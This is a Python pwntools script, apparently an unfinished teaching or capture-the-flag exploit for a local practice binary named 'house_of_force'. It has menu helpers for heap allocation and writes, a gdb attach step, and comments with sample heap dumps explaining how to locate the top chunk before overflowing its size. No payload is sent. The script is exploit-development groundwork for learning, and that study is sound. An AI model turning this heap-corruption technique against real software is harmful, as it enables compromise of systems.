#!/usr/bin/env python3
from pwn import *
exe = context.binary = ELF('./house_of_force')

def menu(r, choice):
    r.recvuntil(b'> ')
    r.sendline(str(choice).encode())

def leak(r):
    menu(r, 0)
    r.recvuntil(b'something.\n')
    leak = []
    r.recvuntil(b'do_nothing: ')
    leak.append(int(r.recvline().decode(), base=16))
    r.recvuntil(b'do_something: ')
    leak.append(int(r.recvline().decode(), base=16))
    return leak

def malloc(r, index, size):
    menu(r, 1)
    r.recvuntil(b'allocate?\n> ')
    r.sendline(str(index).encode())

    resp = r.recvline()
    if b'What size' not in resp:
        log.warn(f'malloc(r, {index}, {size}) failed. Invalid index value.')
        return
    r.recvuntil(b'> ')
    r.sendline(str(size).encode())

    resp = r.recvline()
    if b'address' not in resp:
        log.warn(f'malloc(r, {index}, {size}) failed. Invalid size value.')
        return

    chunk = resp.split(b':')[1].strip()
    chunk = int(chunk, base=16)
    return chunk
    
def write_chunk(r, index, data):
    menu(r, 2)
    r.recvuntil(b'write to?\n> ')
    r.sendline(str(index).encode())

    resp = r.recvline()
    if b'Now enter' not in resp:
        log.warn(f'write_chunk(r, {index}, {data}) failed. Invalid index value.')
        return

    r.recvuntil(b'> ')
    r.sendline(data)

def do_nothing(r):
    menu(r, 3)
    resp = r.recvline()
    print(f'Do nothing output: \"{resp}\"')

def quit(r):
    menu(r, 4)

io = exe.process()

# allocate one chunk to see where it is at
chunk1_size = 20
chunk1_address = malloc(io, 0, chunk1_size)

# Output our chunk to make sure it is on the heap
log.info(f'Chunk 1 allocated to {hex(chunk1_address)}')

gdb.attach(io)
input('?')
# now we open gdb to see how far our chunk is from the heap of the base
# using the command `vmmap` we can see where the heap begins and calculate
# the base address of the heap (if we ever wanted to use it)
chunk1_offset = 0 # ???
heap_base = chunk1_address - chunk1_offset

# we also want to find the location of the wilderness, so we know how much
# to overflow the heap by and where we want to write our fake size.
# an example gdb output is shown below
"""
gdb> x/6gx 0x5d40380912a0 - 0x8 

0x5d4038091298:	0x0000000000000021	0x0000000000000000 <-- left column is chunk1's metadata
                                                               right is beginning of where we can 
                                                               write
0x5d40380912a8:	0x0000000000000000	0x0000000000000000


0x5d40380912b8:	0x0000000000020d51	0x0000000000000000 <-- left column is wilderness
                                                               size left
"""
